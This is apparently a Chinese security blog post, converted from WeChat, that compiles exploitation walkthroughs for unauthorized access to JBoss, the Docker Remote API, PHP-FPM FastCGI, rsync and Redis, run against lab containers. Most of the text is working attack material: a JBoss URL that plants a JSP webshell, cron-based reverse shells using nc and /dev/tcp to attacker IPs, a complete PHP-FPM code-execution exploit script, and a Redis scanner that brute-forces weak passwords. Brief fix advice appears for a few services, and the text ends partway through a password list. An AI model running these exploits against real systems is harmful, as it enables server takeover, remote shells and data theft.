> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hunuYAWkHliBCutCjymaQw)

漏洞汇总

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaPNrb3f20j38XsR35c0ZGrhUEb59oJETJ9etQtvUWmAOsnPpka3njcQ/640?wx_fmt=png)

**jboss 未授权访问漏洞**

**漏洞描述**

    此漏洞主要是由于 JBoss 中 / jmx-console/HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到 jmx 控制台，并在其中执⾏任何功能  
    未授权访问管理控制台, 通过该漏洞, 可以后台管理服务, 可以通过脚本命令执行系统命令, 如反弹 shell,wget 写 webshell 文件

**影响版本**

    jboss 4.x 以下

**环境搭建**

    使用 docker 搭建的靶场，访问页面 your-ip:8080

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaJybgXfbXN0tkQBr3FYg6icLSoUuvbAbLXwK99VSOORCDVibaQAHiclJ8Q/640?wx_fmt=png)

**漏洞检测**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUavPCTGCkfIUibNiawbPz7vPOH3lJ9hdeErRq96icvnpU8aRzjrtSCNdq6Q/640?wx_fmt=png)

**漏洞复现**  

**1. 写入一句话木马**

```
http://ip/jmx-console//HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=August.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True
```

    url 中的参数: arg0 代表 war 包的名称，arg1 = 文件名称，arg2 = 文件后缀名，arg3 = 文件内容

将 arg3 的中值取出来并进行 url 解码后为

```
<% if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(“/”)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes()); %>
```

    这个语句的功能是写入文件，f = 文件名，t = 文件内容，执行后回显

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaicErWnu7QSMozHKcdREMleZCrY8FvicfIygtoPg6mwD4sHhaxrtulFbg/640?wx_fmt=png)

    写入 1.txt 文件  

```
http://ip:8080/August/shell.jsp?f=1.txt&t=hello%20world!
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaxYhvyu0MmYDd1PJiavfzemobe7GWFKtJBXPgNcOMdAPTG4HVFJaTLlw/640?wx_fmt=png)

    访问 1.txt 文件，成功写入文件，这里也可以写入一句话木拉，然后使用一句话木马管理工具进行连接

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaHtnJKR4ET2Q20MNrsqo1jqUnuoK6S0TJYAmRQhQuB9Ujy5l97fHC5w/640?wx_fmt=png)**

**2. 上传木马  
**

    1. 发现 jboss 默认页面，点击进入控制页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaibH2HibN1zxKaicTqYyNA1LuiaCKeGrqIfgu9QGxuD48apJBxTFoiaZzcDA/640?wx_fmt=png)

    2. 点击 jboss.deployment 进入应用部署页面，如果需要登录可以尝试爆破弱口令登录 (admin/admin)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUatZjv4kxVZTgv9hoH6WDUfdZsJPnXm1bibZ6skVypILMB5YHj7oQL3icA/640?wx_fmt=png)

    3. 这里使用 phpstudy 搭建远程木马服务器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUa0NicwUYfVkWy2Z8xy7R6qXIFKVULicDr5CXaVZ0euwmPbSgx2LNPsOzw/640?wx_fmt=png)

    4. 使用冰蝎马生成 war 包 ，将 war 包放在 /www / 目录下

```
冰蝎马生成
java -jvf shell.war shell.jsp
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaXeEmAZicd8CGqkwaHvSHyQ39jjibj6DP41cKFyANzH3sg9TexaOjnzWw/640?wx_fmt=png)

    5. 使用 addurl 参数进行木马的远程部署

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUa4licjkUcv8M7fe5DD0hI3CZEiblMAuLKP0sxP3mb17Kiah6IBibZhy0vSQ/640?wx_fmt=png)

    回显页面  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaNy5uYPYMxvREicc7Zo8gt1iaju71Co0fdckoRiaGzEYxEJC8g3DCicZoFg/640?wx_fmt=png)

    6. 查看是否有部署成功，返回刚进入的 jmx-console 页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的 war 包即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUahatMmoNwBL93G1DRibMUPQkaP223ILrc1ricQUcbhkCm1ywTdM8kW9FA/640?wx_fmt=png)

    7. 访问 your-ip:8080/shell, 说明成功部署

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaic0QDvxZq6Va1RHicvibjjCoy7qrNL40AztaFuticUhGS3fezGhDmOA6Jw/640?wx_fmt=png)

    8. 使用冰蝎连接 默认密码为 (rebeyond)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUalSqXJpYYAwOJYibLpYzCezQjeHkia1pCVeZU54Bk7D5Ek1AamuDoPZ5Q/640?wx_fmt=png)

**docker 未授权访问漏洞**

**漏洞简介**

Docker Remote API 是一个取代远程命令行界面（rcli）的 REST API。通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。

docker swarm 是 docker 下的分布化应用的本地集群，在开放 2375 端口监听集群容器时，会调用这个 api

**漏洞成因**

```
1. dockerd -H unix:///var/run/docker. sock -H 0.0. 0.0:2375
2. docker守护进程监听在0.0.0.0，外网可访问
3.没有使用iptable等限制可连接的来源ip。
```

**漏洞检测**

    输入地址 http://your-ip:2375/version, 若能访问，证明存在未授权访问漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUa6fgTkffCWqthicLm00m8q7mDbuw0RontibTTYnNyy60XrZC6XhGLfzcg/640?wx_fmt=png)

 使用命令行获取信息 (docker 环境下)

```
docker -H tcp://192.168.1.7:2375 images                  //获取镜像信息
docker -H tcp://192.168.1.7:2375 run 28f6e2705743        //启动docker容器
docker -H tcp://192.168.1.7:2375    ps -a                //获取容器信息
docker -H tcp://192.168.1.7:2375                        //关闭容器
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUamcK7wf0mvETSPbnPsAIEegibdKibxvDuIHPWHqVlfib7DuBuB8iaT4aiaJQ/640?wx_fmt=png)

**利用方法**

```
随意启动一个容器，并将宿主机的 / 目录挂载到容器的 /mnt目录，这样就可以操作宿主机中的文件了
docker -H tcp://192.168.1.7:2375 run -it -v /:/mnt 28f6e2705743 /bin/sh

攻击机监听
root@kali:~# nc -lvvp 6666
listening on [any] 6666 ...

写入就计划任务，反弹shell
echo "* * * * * /usr/bin/nc 192.168.83.100 6666 -e /bin/sh" >> /mnt/etc/crontabs/root
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUamcK7wf0mvETSPbnPsAIEegibdKibxvDuIHPWHqVlfib7DuBuB8iaT4aiaJQ/640?wx_fmt=png)

成功反弹 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaCqEUFgY7PeOY3FADdB0bic1fmDfQ9kBIEImvtSZkwKwBPNWe0iaPVCXQ/640?wx_fmt=png)

进入容器查看定时任务，*/15 的意思为每 15 分钟执行一次

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUa8BroESSqczBF8967J5PYBU0mb4u9TMh6FeRAdTySyf5PumGhkRcp4A/640?wx_fmt=png)

**也可以使用工具进行反弹 shell**  

    client 改为存在漏洞的 ip 地址  
    data 将 ip 改为反弹 shell 的地址  
    定时任务每 15 分钟执行一次

```
import docker

client = docker.DockerClient(base_url='http://your-ip:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e 
/bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 
'rw'}})
```

**修复方法**

1）配置 acl，Docker Remote API 不要绑定到 0.0.0.0。  
2）修改 docker swarm 的认证方式，使用 TLS 认证。

**PHP-FPM Fastcgi 未授权访问漏洞**

**Fastcgi**

    Fastcgi 是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。HTTP 协议是浏览器和服务器中间件进行数据交换的协议，浏览器将 HTTP 头和 HTTP 体用某个规则组装成数据包，以 TCP 的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以 HTTP 协议的规则打包返回给服务器。类比 HTTP 协议来说，fastcgi 协议则是服务器中间件和某个语言后端进行数据交换的协议

**PHP-FPM**

    PHP-FPM 是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好传给 FPM。FPM 按照 fastcgi 的协议将 TCP 流解析成真正的数据。PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信。  
用户访问 http://127.0.0.1/index.php?a=1&b=2，如果 web 目录是 / var/www/html，那么 Nginx 会将这个请求变成如下 key-value 对：

```
{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/html/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&b=2',
'REQUEST_URI': '/index.php?a=1&b=2',
'DOCUMENT_ROOT': '/var/www/html',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': "localhost",
'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

    这个数组其实就是 PHP 中 $_SERVER 数组的一部分，也就是 PHP 里的环境变量。但环境变量的作用不仅是填充 $_SERVER 数组，也是告诉 fpm：“我要执行哪个 PHP 文件”。  
    PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 / var/www/html/index.php

**security.limit_extensions 配置**

    此时，SCRIPT_FILENAME 的值就格外重要了。因为 fpm 是根据这个值来执行 php 文件的，如果这个文件不存在，fpm 会直接返回 404。在 fpm 某个版本之前，我们可以将 SCRIPT_FILENAME 的值指定为任意后缀文件，比如 / etc/passwd。但后来，fpm 的默认配置中增加了一个选项 security.limit_extensions。其限定了只有某些后缀的文件允许被 fpm 执行，默认是. php。所以，当我们再传入 / etc/passwd 的时候，将会返回 Access denied。由于这个配置项的限制，如果想利用 PHP-FPM 的未授权访问漏洞，首先就得找到一个已存在的 PHP 文件。我们可以找找默认源安装后可能存在的 php 文件，比如 / usr/local/lib/php/PEAR.php

**任意代码执行**  

    PHP.INI 中有两个有趣的配置项，auto_prepend_file 和 auto_append_file。auto_prepend_file 是告诉 PHP，在执行目标文件之前，先包含 auto_prepend_file 中指定的文件；auto_append_file 是告诉 PHP，在执行完成目标文件后，包含 auto_append_file 指向的文件。  
    那么假设我们设置 auto_prepend_file 为 php://input，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容。所以，我们只需要把待执行的代码放在 Body 中，他们就能被执行了。（当然，还需要开启远程文件包含选项 allow_url_include）  
    那么，如何设置 auto_prepend_file 的值？这又涉及到 PHP-FPM 的两个环境变量，PHP_VALUE 和 PHP_ADMIN_VALUE。这两个环境变量就是用来设置 PHP 配置项的，PHP_VALUE 可以设置模式为 PHP_INI_USER 和 PHP_INI_ALL 的选项，PHP_ADMIN_VALUE 可以设置所有选项。（disable_functions 除外，这个选项是 PHP 加载的时候就确定了，在范围内的函数直接不会被加载到 PHP 上下文中）所以，我们最后传入如下环境变量

```
{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/html/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&b=2',
'REQUEST_URI': '/index.php?a=1&b=2',
'DOCUMENT_ROOT': '/var/www/html',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': "localhost",
'SERVER_PROTOCOL': 'HTTP/1.1'
'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```

**复现**

使用 exp

```
import socket
import random
import argparse
import sys
from io import BytesIO
# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
PY2 = True if sys.version_info.major == 2 else False
def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])
 
def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)
 
def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')
 
def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s
 
 
class FastCGIClient:
    """A Fast-CGI Client for Python"""
 
    # private
    __FCGI_VERSION = 1
 
    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3
 
    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11
 
    __FCGI_HEADER_SIZE = 8
 
    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3
 
    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()
 
    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True
 
    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf
 
    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value
 
    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header
 
    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))
 
        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record
 
    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return
 
        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)
 
        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)
 
        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
 
        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)
 
    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf
 
        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']
 
    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)
 
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
 
    args = parser.parse_args()
 
    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
    print(force_text(response))
```

**使用**

```
使用命令执行一个默认存在的php文件
python fpm.py your-ip /usr/local/lib/php/PEAR.php
任意命令执行
python fpm.py 192.168.1.7 /usr/local/lib/php/PEAR.php -c '<?php echo `pwd`; ?>'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUadFHZ8rEp6Jzgr8UVDbeIJ3y3dSfFPxDzxrmicNGTzWeibe05sEUF35Iw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaYn06OtVIDTnhaJ1AYJej48qMJicmGnoQo9nsYuWgdCGcoiabTZQODHLA/640?wx_fmt=png)

**rsync 未授权访问漏洞  
**

**漏洞简介  
**

    rsync 是 Linux 下一款数据备份工具，支持通过 rsync 协议、ssh 协议进行远程文件传输。其中 rsync 协议默认监听 873 端口，如果目标开启了 rsync 服务，并且没有配置 ACL 或 访问密码，我们将可以读写目标服务器文件。

    rsync 未授权访问带来的危害主要有两个: 一个造成了严重的信息泄露；二是上传脚本后门文件，远程命令执行

**rsync 配置文件**

    该漏洞最大的隐患在于写权限的开启，一旦开启了写权限，用户就可以利用该权限写马或者写一句话，从而拿到 shell。

    看一下配置文件的网相关选项（/etc/rsync.conf）  
    这一项 read only 表示只读，如果这一项为 no，就具有写权限了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaicYNvGIq68iajAJJbicPAUZuSkV6a0fCEBkia6H1muDahO9LOkLiaSgaanQ/640?wx_fmt=png)

**(使用 docker 搭建的 vulhub 靶场的 rsyncd.conf 配置文件)**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUadTnU6QSgZsicxbPXs1NibjibUemZ8SNsv52aIJhGic2mYfBWtYUNKAOObg/640?wx_fmt=jpeg)

    根据以上配置文件发现，我们可以访问 path 所指定目录以外的目录，该配置还定义了一个 src 模块，路径指向根目录，而且可读可写，最重要的是没有设置用户名，如此便无需密码直接访问 rsync  

**配置参数说明**

```
motd file -> motd文件位置
log file -> 日志文件位置
path -> 默认路径位置
use chroot -> 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录
read only -> 只读配置（yes or no）
list=true -> 是否可以列出模块名
uid = root -> 传输使用的用户名
gid = root -> 传输使用的用户组
auth users -> 认证用户名
secrets file=/etc/rsyncd.passwd -> 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password
hosts allow=192.168.0.101  -> 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开
hosts deny 禁止的主机，host的两项可以使用*表任意。
```

**利用方式**

  rsync 未授权访问漏洞只需使用 rsync 命令即可进行检测。首先使用 nmap 或其他扫描端口工具对目标进行端口扫描，当检测到目标服务器开启 873 端口后，使用 rsync 命令，查看是否能获取到模块名列表 (需要同步的目录)，然后查看模块内的文件

**使用 nmap 扫描目标系统是否开放 rsync 服务**

```
nmap -p 873 --script rsync-list-modules 192.168.1.7
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaQDbQkKvDzbznpu8yrI8MaxCib6qGHWiamezRYTUve8K5M9aj7lDEGDsw/640?wx_fmt=jpeg)

**列出目标服务器的同步记录**

```
rsync ip::
rsync rsync://ip:873
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaZfozThrW6t71cPdqxia2RF86EL5NjRTAg7iblL9eB2xJjNfcicfGumEFA/640?wx_fmt=jpeg)

**查看模块文件**

 获取到目录之后，只需在路径后添加目录名即可查看目录中的文件  
   这里查看 src 目录

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaobgo36x6JRibVchavsdq83dabMmof4icZRzcPLiaYCicRicHrAQ5sIe1xlA/640?wx_fmt=jpeg)

**下载任意目录文件**

```
rsync -av ip::src
```

    假如下载 / etc/passwd 文件到 /opt / 目录下

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUajQ7D4rWItkAdicPlJsGE8gddXmjRgLYzTgFvT2q18YKDw2QUberWezQ/640?wx_fmt=jpeg)

    查看 passwd.txt 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUahenkeGR3RRiaLo3hddjVHyqBx4ic735uicT2NM7bF2No4F1ykVO83qZibQ/640?wx_fmt=png)

**也可以向目标系统上传任意文件**

```
rsync -av crontab1 rsync://192.168.0.113:873/src/etc/crontab1

//rsync -av 文件路径 rsync://ip:873/目标系统文件路径
```

**反弹 shell**

    1. 下载 cron 定时任务配置文件并查看任务内容

```
rsync -av rsync://ip/src/etc/crontab crontab.txt
cat crontab.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaBMicsRiaj905JC8WmyDTltjrfxiajzGH1IaI6dZ4E8LJiaH9yiahykQUTsg/640?wx_fmt=jpeg)

```
//17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
//表示17分钟会启动/etc/cron.hourly目录下文件的任务
```

    2. 攻击机创建一个 shell 文件

```
touch shell
//文件写入反弹shell命令
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.1.6/4444 0>&1
```

    3. 传入 /etc/cron.hourly 目录下，写入到 cron.hourly 下文件的任务就会启动

```
rsync -av shell rsync://ip:873/src/etc/cron.hourly
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUa022SGR3XlTdQHOlR3bukzmHMmld8gXBKroF65eK8vDENiaYwkBbmKxA/640?wx_fmt=jpeg)

    4. 使用 vps(windows) 监听 4444 端口，等待 17 分钟后，接收反弹的 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaE0ecDhVajv26CziaXh2Ngm96icITFeX3XU5VficPeVIguqCm3NGxkrMWA/640?wx_fmt=png)

**修复建议**  

```
更改rysnc默认配置文件/etc/rsyncd.conf，添加或修改参数：
访问控制；设置host allow，限制允许访问主机的IP。
权限控制；设置auth users ，将模块设置成只读。
权限控制；设置read only，将模块设置成只读。
访问认证；设置auth、secrets，认证成功才能调用服务。
模块隐藏；设置list，将模块隐藏。
```

**Redis 未授权访问漏洞**

    redis 是一个数据库，默认端口是 6379，redis 默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作 redis 进一步控制服务器。  
    Redis 未授权访问在 4.x/5.0.5 以前版本下，可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。

**影响版本**  

    影响版本 Redis 4.x/5.0.5 以前版本

**环境搭建**

    使用 docker 搭建的 vulhub 靶场

**漏洞检测**  

    redis 未授权批量检测工具脚本，该脚本支持弱口令检测。

```
#!/usr/bin/python2
# -*- coding: utf-8 -*-

import socket
import sys

def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.send("INFO\r\n")
        result = s.recv(1024)
        if "redis_version" in result:
            return u"[+] IP:{0}存在未授权访问".format(ip)
        elif "Authentication" in result:
            with open('pass.txt','r') as  p:
                passwds = p.readlines()
                for passwd in passwds:
                    passwd = passwd.strip("\n")
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, int(port)))
                    s.send("AUTH %s\r\n" %(passwd))
                    # print u"[HACKING] hacking to passwd --> "+passwd
                    result = s.recv(1024)
                    if 'OK' in result:
                        return u"[+] IP:{0} 存在弱口令，密码：{1}".format(ip,passwd)
                    else:pass
        else:pass
        s.close()
    except Exception, e:
        return u"[+] IP:{0}已过滤".format(ip)
        pass

if __name__ == '__main__':
    port="6379"
    with open('IP.txt','r') as  f:
        ips = f.readlines()
        for i in ips:
            ip = i.strip("\n")
            result = check(ip,port,timeout=10)
            print(result)
```

    在该脚本同目录下新建 IP.txt 导入要检测的目标 IP，格式如:

```
192.168.126.128
192.168.126.129
192.168.126.130
192.168.126.131
...
```

    在脚本同目录下新建 pass.txt 导入弱口令字典，格式如下：

```
redis
root
oracle
password
p@ssw0rd
abc123!
